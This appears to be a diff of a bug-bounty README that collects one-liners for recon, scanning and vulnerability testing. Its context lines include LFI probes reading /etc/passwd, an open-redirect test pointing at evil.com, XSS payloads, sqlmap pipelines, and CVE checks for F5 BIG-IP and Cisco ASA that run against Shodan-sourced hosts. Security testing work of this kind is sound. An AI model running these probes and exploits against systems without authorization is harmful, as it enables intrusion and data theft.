@@ -1,4 +1,5 @@
 # Awesome One-liner Bug Bounty [![Awesome](https://awesome.re/badge-flat2.svg)](https://awesome.re)
+>
 > A collection of awesome one-liner scripts especially for bug bounty.
 
 This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily♥ welcome.
@@ -17,6 +18,7 @@ This section defines specific terms or placeholders that are used throughout one
 ---
 
 ### Local File Inclusion
+>
 > @dwisiswant0
 
 ```bash
@@ -24,6 +26,7 @@ gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"
 ```
 
 ### Open-redirect
+>
 > @dwisiswant0
 
 ```bash
@@ -31,11 +34,13 @@ export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25
 ```
 
 > @N3T_hunt3r
+
 ```bash
 cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
 ```
 
 ### XSS
+>
 > @cihanmehmet
 
 ```bash
@@ -55,6 +60,7 @@ cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?
 ```
 
 ### Prototype Pollution
+>
 > @R0X4R
 
 ```bash
@@ -62,6 +68,7 @@ subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt &
 ```
 
 ### CVE-2020-5902
+>
 > @Madrobot_
 
 ```bash
@@ -71,6 +78,7 @@ shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separat
 # 🐛 Bug Bounty Methodology & Tools
 
 ## �� Table of Contents
+
 1. [Reconnaissance](#reconnaissance)
 2. [Subdomain Enumeration](#subdomain-enumeration)
 3. [Port Scanning & Service Discovery](#port-scanning--service-discovery)
@@ -87,6 +95,7 @@ shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separat
 ### Shodan (sqry) Queries
 
 #### Basic Service Discovery
+
 ```bash
 # HTTP/HTTPS Services
 sqry -q "port:80" --json --limit 50
@@ -103,6 +112,7 @@ sqry -q "port:27017" --json --limit 50 # MongoDB
 ```
 
 #### Service-Specific Searches
+
 ```bash
 # Jenkins servers
 sqry -q "Jenkins" --json --limit 50
@@ -119,6 +129,7 @@ sqry -q "ssl:true" --domains --with-domains
 ```
 
 #### Vulnerability-Focused Queries
+
 ```bash
 # Critical vulnerabilities
 sqry --min-cvss 9.0 --max-cvss 10.0 --json
@@ -131,6 +142,7 @@ sqry --cve CVE-2016-10087 --cve-json --pretty
 ```
 
 ### Asset Discovery
+
 ```bash
 # ASN enumeration
 amass intel -asn <ASN_Number> -o asn_ips.txt
@@ -147,6 +159,7 @@ censys search "autonomous_system.asn:<ASN_Number>" -o censys_assets.txt
 ## 🌐 Subdomain Enumeration
 
 ### Passive Enumeration
+
 ```bash
 # Basic subdomain discovery
 subfinder -d <domain> -o subdomains.txt
@@ -161,6 +174,7 @@ assetfinder --subs-only <domain> | tee -a domains.txt
 ```
 
 ### Active Enumeration
+
 ```bash
 # DNS bruteforce
 subfinder -d <domain> -b -o subdomains.txt
@@ -176,6 +190,7 @@ done < wordlist.txt
 ```
 
 ### External Sources
+
 ```bash
 # RapidDNS
 export host="<domain>"
@@ -201,6 +216,7 @@ sed -e 's_https*://__' -e "s/\/.*//" | sort -u
 ## 🔌 Port Scanning & Service Discovery
 
 ### Nmap Scanning
+
 ```bash
 # Basic service scan
 nmap -sV <target_ip>
@@ -216,18 +232,21 @@ nmap -p- --min-rate 1000 -T4 -A <target> -oA fullscan
 ```
 
 ### Masscan
+
 ```bash
 # High-speed port scan
 masscan -p0-65535 <target> --rate 100000 -oG masscan-results.txt
 ```
 
 ### Naabu
+
 ```bash
 # Fast port scanning
 naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
 ```
 
 ### LazyHunter (CVE Analysis)
+
 ```bash
 # CVE and port scanning
 hunter.py --cve+ports --target <target_ip> --json-output results.json
@@ -244,6 +263,7 @@ hunter.py --host --ports --target <target_ip> --json-output quick_scan.json
 ## 🛡️ Vulnerability Testing
 
 ### SQL Injection
+
 ```bash
 # Basic SQLi testing
 ghauri -u "https://target.com?id=1" --dbs --batch
@@ -256,6 +276,7 @@ cat domains.txt | httpx | waybackurls | gf sqli | sqlmap -m sqli.txt --dbs --bat
 ```
 
 ### Cross-Site Scripting (XSS)
+
 ```bash
 # XSS testing with dalfox
 gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | 
@@ -275,6 +296,7 @@ done
 ```
 
 ### Local File Inclusion (LFI)
+
 ```bash
 # LFI testing
 cat live_websites.txt | gf lfi | qsreplace "/etc/passwd" | 
@@ -286,6 +308,7 @@ while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
 ```
 
 ### Open Redirect
+
 ```bash
 # Open redirect testing
 export LHOST="https://evil.com"
@@ -294,12 +317,14 @@ xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "
 ```
 
 ### CSRF Testing
+
 ```bash
 # CSRF endpoint discovery
 cat live_websites.txt | gf csrf | tee csrf_endpoints.txt
 ```
 
 ### Subdomain Takeover
+
 ```bash
 # Subdomain takeover detection
 subzy --targets subs.txt --concurrency 100
@@ -313,6 +338,7 @@ cat subs.txt | dnsprobe -r CNAME
 ## 🌐 Web Application Security
 
 ### Endpoint Discovery
+
 ```bash
 # Wayback URLs
 cat domains.txt | waybackurls | tee -a urls.txt
@@ -328,12 +354,14 @@ cat wayback_urls.txt gau_urls.txt katana_urls.txt | sort -u > aggregated_endpoin
 ```
 
 ### Parameter Discovery
+
 ```bash
 # Arjun for parameter discovery
 arjun -q -u target -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
 ```
 
 ### JavaScript Analysis
+
 ```bash
 # Extract JS files
 katana -u livehosts.txt -jc -o jsfiles.txt
@@ -346,6 +374,7 @@ cat js_files.txt | grep -Ei "key|token|auth|password" > sensitive_data.txt
 ```
 
 ### Screenshot Capture
+
 ```bash
 # Single screenshot
 gowitness single -u http://<target_domain> -s screenshot.png
@@ -362,6 +391,7 @@ gowitness capture -u http://<target_domain> --status
 ## �� Automation & One-liners
 
 ### Complete Recon Pipeline
+
 ```bash
 # 1. Subdomain enumeration
 sublist3r -d target | tee -a domains.txt
@@ -382,6 +412,7 @@ sqlmap -m sqli.txt --dbs --batch --level 3 --risk 2 --time-sec 10 --random-agent
 ```
 
 ### Nuclei Automation
+
 ```bash
 # Basic nuclei scan
 nuclei -l livehosts.txt -tags misconfig
@@ -396,6 +427,7 @@ subfinder -d intigriti.com | httpx | nuclei -tags exposure -o output.txt; notify
 ### CVE-Specific One-liners
 
 #### CVE-2020-5902 (F5 BIG-IP)
+
 ```bash
 shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | 
 awk '{print $1":"$2}' | while read host; do 
@@ -405,6 +437,7 @@ done
 ```
 
 #### CVE-2020-3452 (Cisco ASA)
+
 ```bash
 while read LINE; do 
   curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | 
@@ -413,6 +446,7 @@ done < HOSTS.txt
 ```
 
 #### CVE-2022-0378
+
 ```bash
 cat URLS.txt | while read h; do 
   curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|
@@ -425,6 +459,7 @@ done
 ## 📝 Reporting Templates
 
 ### Executive Summary Template
+
 ```
 ## Executive Summary
 - **Target**: [Target Name]
@@ -439,6 +474,7 @@ done
 ```
 
 ### Vulnerability Report Template
+
 ```
 ## [Vulnerability Title]
 
@@ -468,8 +504,8 @@ done
 [Links to CVE, OWASP, or other resources]
 ```
 
-
 ### CVE-2020-3452
+>
 > @vict0ni
 
 ```bash
@@ -477,6 +513,7 @@ while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst
 ```
 
 ### CVE-2022-0378
+>
 > @7h3h4ckv157
 
 ```bash
@@ -484,6 +521,7 @@ cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2
 ```
 
 ### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
+>
 > @Madrobot_
 
 ```bash
@@ -491,6 +529,7 @@ shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " 
 ```
 
 ### Find JavaScript Files
+>
 > @D0cK3rG33k
 
 ```bash
@@ -498,6 +537,7 @@ assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.
 ```
 
 ### Extract Endpoints from JavaScript
+>
 > @renniepak
 
 ```bash
@@ -505,6 +545,7 @@ cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' |
 ```
 
 ### Get CIDR & Org Information from Target Lists
+>
 > @steve_mcilwain
 
 ```bash
@@ -513,6 +554,7 @@ one | uniq); done
 ```
 
 ### Get Subdomains from RapidDNS.io
+>
 > @andirrahmani1
 
 ```bash
@@ -520,6 +562,7 @@ export host="HOST" ; curl -s "https://rapiddns.io/subdomain/$host?full=1#result"
 ```
 
 ### Get Subdomains from BufferOver.run
+>
 > @\_ayoubfathi\_
 
 ```bash
@@ -527,11 +570,13 @@ curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d','
 ```
 
 > @AnubhavSingh_
+
 ```bash
 export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"
 ```
 
 ### Get Subdomains from Riddler.io
+>
 > @pikpikcu
 
 ```bash
@@ -539,6 +584,7 @@ curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\
 ```
 
 ### Get Subdomains from VirusTotal
+>
 > @pikpikcu
 
 ```bash
@@ -546,6 +592,7 @@ curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep 
 ```
 
 ### Get Subdomain with cyberxplore
+>
 > @pikpikcu
 
 ```
@@ -553,6 +600,7 @@ curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w
 ```
 
 ### Get Subdomains from CertSpotter
+>
 > @caryhooper
 
 ```bash
@@ -560,6 +608,7 @@ curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains
 ```
 
 ### Get Subdomains from Archive
+>
 > @pikpikcu
 
 ```bash
@@ -567,6 +616,7 @@ curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=origi
 ```
 
 ### Get Subdomains from JLDC
+>
 > @pikpikcu
 
 ```bash
@@ -574,13 +624,15 @@ curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)
 ```
 
 ### Get Subdomains from securitytrails
+>
 > @pikpikcu
 
 ```bash
 curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u
 ```
 
-### Bruteforcing Subdomain using DNS Over 
+### Bruteforcing Subdomain using DNS Over
+>
 > @pikpikcu
 
 ```
@@ -588,6 +640,7 @@ while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd
 ```
 
 ### Get Subdomains With sonar.omnisint.io
+>
 > @pikpikcu
 
 ```
@@ -595,6 +648,7 @@ curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._
 ```
 
 ### Get Subdomains With synapsint.com
+>
 > @pikpikcu
 
 ```
@@ -602,6 +656,7 @@ curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHO
 ```
 
 ### Get Subdomains from crt.sh
+>
 > @vict0ni
 
 ```bash
@@ -609,6 +664,7 @@ curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 
 ```
 
 ### Sort & Tested Domains from Recon.dev
+>
 > @stokfedrik
 
 ```bash
@@ -616,6 +672,7 @@ curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomain
 ```
 
 ### Subdomain Bruteforcer with FFUF
+>
 > @GochaOqradze
 
 ```bash
@@ -623,6 +680,7 @@ ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
 ```
 
 ### Find Allocated IP Ranges for ASN from IP Address
+>
 > wains.be
 
 ```bash
@@ -630,6 +688,7 @@ whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep o
 ```
 
 ### Extract IPs from a File
+>
 > @emenalf
 
 ```bash
@@ -637,6 +696,7 @@ grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0
 ```
 
 ### Ports Scan without CloudFlare
+>
 > @dwisiswant0
 
 ```bash
@@ -644,6 +704,7 @@ subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 4
 ```
 
 ### Create Custom Wordlists
+>
 > @tomnomnom
 
 ```bash
@@ -655,6 +716,7 @@ cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort 
 ```
 
 ### Extracts Juicy Informations
+>
 > @Prial Islam Khan
 
 ```bash
@@ -662,6 +724,7 @@ for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicato
 ```
 
 ### Find Subdomains TakeOver
+>
 > @hahwul
 
 ```bash
@@ -669,6 +732,7 @@ subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -nor
 ```
 
 ### Dump Custom URLs from ParamSpider
+>
 > @hahwul
 
 ```bash
@@ -676,6 +740,7 @@ cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
 ```
 
 ### URLs Probing with cURL + Parallel
+>
 > @akita_zen
 
 ```bash
@@ -683,6 +748,7 @@ cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_dow
 ```
 
 ### Dump In-scope Assets from `chaos-bugbounty-list`
+>
 > @dwisiswant0
 
 ```bash
@@ -690,6 +756,7 @@ curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/maste
 ```
 
 ### Dump In-scope Assets from `bounty-targets-data`
+>
 > @dwisiswant0
 
 #### HackerOne Programs
@@ -729,6 +796,7 @@ curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federac
 ```
 
 ### Dump URLs from sitemap.xml
+>
 > @healthyoutlet
 
 ```bash
@@ -736,6 +804,7 @@ curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's
 ```
 
 ### Pure Bash Linkfinder
+>
 > @ntrzz
 
 ```bash
@@ -743,6 +812,7 @@ curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep "
 ```
 
 ### Extract Endpoints from swagger.json
+>
 > @zer0pwn
 
 ```bash
@@ -750,6 +820,7 @@ curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
 ```
 
 ### CORS Misconfiguration
+>
 > @manas_hunter
 
 ```bash
@@ -757,6 +828,7 @@ site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https:/
 ```
 
 ### Find Hidden Servers and/or Admin Panels
+>
 > @rez0__
 
 ```bash
@@ -764,6 +836,7 @@ ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt
 ```
 
 ### Recon Using api.recon.dev
+>
 > @z0idsec
 
 ```bash
@@ -771,6 +844,7 @@ curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].do
 ```
 
 ### Find Live Host/Domain/Assets
+>
 > @_YashGoti_
 
 ```bash
@@ -778,6 +852,7 @@ subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/'
 ```
 
 ### XSS without gf
+>
 > @HacktifyS
 
 ```bash
@@ -785,6 +860,7 @@ waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while re
 ```
 
 ### Get Subdomains from IPs
+>
 > @laughface809
 
 ```bash
@@ -792,6 +868,7 @@ python3 hosthunter.py HOSTS.txt > OUT.txt
 ```
 
 ### Gather Domains from Content-Security-Policy
+>
 > @geeknik
 
 ```bash
@@ -799,9 +876,9 @@ curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0
 ```
 
 ### Nmap IP:PORT Parser Piped to HTTPX
+>
 > @dwisiswant0
 
 ```bash
 nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
 ```
-
